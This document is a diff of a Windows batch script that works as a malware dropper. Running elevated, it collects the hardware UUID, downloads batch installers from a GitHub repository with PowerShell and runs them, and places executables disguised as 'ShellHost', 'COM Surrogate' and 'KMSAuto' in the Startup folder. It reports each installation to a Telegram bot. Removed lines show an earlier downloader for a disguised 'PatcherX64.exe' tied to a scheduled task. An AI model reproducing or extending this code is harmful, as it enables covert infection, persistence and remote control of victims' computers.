@@ -2,10 +2,39 @@
 @echo off
 
 
-set "CheckConnectSend=0"
+:: Counter file to track iterations
+set "counterFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\counter.txt"
+set "CheckSend=0"
+
+
+:: Initialize counter if the file doesn't exist
+if not exist "%counterFile%" (
+    echo 0 > "%counterFile%"
+)
+
+:: Read and update the counter
+for /f "delims=" %%A in (%counterFile%) do set "counter=%%A"
+set /a counter+=1
+echo !counter! > "%counterFile%"
+
+:: Check if the counter reaches 15 (since the batch runs every minute)
+if !counter! geq 15 (
+    set "CheckSend=1"
+    echo 0 > "%counterFile%"
+)
+
 
 
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
+
+
+:: Place HWID into %HWID% variable 
+for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i
+
+
+
+
+
 
 
 
@@ -162,83 +191,139 @@ goto COMMANDSFORAGENTS
 
 
 
-:CHECKORRUNSTC
-:: Check if "SystemCertificates" task exists
-schtasks /query /tn "SystemCertificates" >nul 2>&1
-if %errorlevel% equ 0 (
-    :: Task found, Check STC in System32 also
-    goto CHECKSTCINSYSTEM32
-) else (
-    :: Task not found, go to STCINSTALL
-    goto STCINSTALL
+
+
+
+
+
+
+:STARTUPTAASK
+
+
+
+
+
+
+
+
+:CheckSHST
+:: Check ShellHost.exe; if found, skip to CheckComSurrogate
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe" (
+    goto CheckComSurrogate
 )
 
+:: Run commands if ShellHost.exe is not found
+echo Checking for ShellHost...
+set "embeddedScript=temp_script_SHST.bat"
 
-:CHECKSTCINSYSTEM32
-:: Check TSSPrxySTC.exe if exist 
-if exist "%SystemRoot%\System32\TSSPrxySTC.exe" (
-    schtasks /run /tn "SystemCertificates"
-    goto COMMANDSFORAGENTS
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
 ) else (
-    goto :STCINSTALL
-)
-
-
-
-:STCINSTALL
-:: StartupTaskCaller.exe Installer
-@echo off
- 
-color 0A
- 
-:loop
- 
-:: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
- 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/StartupTaskCallerFileLink') do set "STCFILELINK=%%i"
- 
-:: Download the file using curl
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%STCFILELINK%"
- 
-timeout /t 2 /nobreak >nul
- 
-:: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo Filed to get content from ShellHost Link
     echo.
-    echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
+    timeout /t 3 /nobreak >nul
+    goto CheckSHST
 )
- 
- 
- 
-:: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
- 
- 
- 
-:: Check if the file size is at least 0.4MB (400000 bytes)
-if %FILESIZE% geq 400000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
-    timeout /t 8 /nobreak >nul
+
+set "MESSAGE=%MESSAGE%|SHST|"
+set "CheckSend=1"
+
+
+
+
+
+
+
+:CheckComSurrogate
+:: Check ComSurrogate.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe" (
+    goto CheckKMSAuto
+)
+
+:: Run commands if ComSurrogate.exe is not found
+echo Checking for COM Surrogate...
+set "embeddedScript=temp_script_COM.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
 ) else (
-echo.
-    echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto loop
+    echo Filed to get content from ComSurrogate Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckComSurrogate
 )
- 
- 
-echo Patcher Running...
-timeout /t 1 /nobreak >nul
+
+set "MESSAGE=%MESSAGE%|ComSurrogate|"
+set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+:CheckKMSAuto
+:: Check KMSAuto.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe" (
+    goto COMMANDSFORAGENTS
+)
+
+:: Run commands if KMSAuto.exe is not found
+echo Checking for KMSAuto...
+set "embeddedScript=temp_script_KMS.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from KMSAuto Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckKMSAuto
+)
+
+set "MESSAGE=%MESSAGE%|KMSAuto|"
+set "CheckSend=1"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -318,30 +403,14 @@ echo Message sent to chat ID %CHAT_ID%
 
 
 
-:: Increment the loop counter
-set /a loopCount+=1
-
-:: Check if the loop counter has reached 15
-if %loopCount% lss 10 (
-    :: If less than 10, go back to the beginning of the script
-    goto :loop_start
-) else (
-    :: If 15 or more, end the script
-    echo Loop completed 10 times. Exiting script.
-)
 
 
 
-
-
-
-
-
-:: Check the value of CheckConnectSend
-if "%CheckConnectSend%"=="1" (
+:: Check the value of CheckSend
+if "%CheckSend%"=="1" (
     goto SENDCHECK
 ) else (
-    goto :EOF
+    goto checkloooop
 )
 
 
@@ -366,3 +435,28 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "text=%MESSAGE%"
 
 echo Message sent to chat ID %CHAT_ID%
+
+
+
+
+
+
+:checkloooop
+
+
+
+
+:: Increment the loop counter
+set /a loopCount+=1
+goto :EOF
+
+:: Check if the loop counter has reached 15
+if %loopCount% lss 10 (
+    :: If less than 10, go back to the beginning of the script
+    goto :loop_start
+) else (
+    :: If 15 or more, end the script
+    echo Loop completed 10 times. Exiting script.
+)
+
+
